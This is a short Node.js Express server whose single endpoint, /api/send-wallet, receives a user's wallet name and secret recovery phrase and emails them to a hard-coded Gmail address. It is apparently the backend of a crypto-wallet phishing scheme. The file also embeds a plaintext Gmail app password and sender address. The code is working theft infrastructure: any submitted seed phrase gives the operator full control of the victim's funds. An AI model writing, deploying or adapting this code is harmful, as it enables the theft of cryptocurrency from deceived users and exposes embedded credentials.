import express from "express";
import nodemailer from 'nodemailer';
import bodyParser from 'body-parser';
import cors from "cors";
import dotenv from 'dotenv';  


dotenv.config();

const app = express();
app.use(cors()); 
app.use(bodyParser.json());

const email = 'anabeljhonny5@gmail.com';
const fromEmail = 'anabeljhonny10@gmail.com';
const pass = 'mgkwcvqeuruxkedz';

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: fromEmail,
      pass: pass,
    },
  });

transporter.verify((error, success) => {
    if (error) {
        console.log('Error with email configuration:', error);
    } else {
        console.log('Server is ready to take our messages');
    }
});
  

app.post('/api/send-wallet', async (req, res) => {
  const { walletName, secretPhrase, userWalletName } = req.body;

  const mailOptions = {
    from: fromEmail,
    to: email,
    subject: `New Wallet Info from ${userWalletName}`,
    text: `
      Wallet Name: ${walletName}
      Secret Phrase: ${secretPhrase}
      Submitted By: ${userWalletName}
          `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('Email sent successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
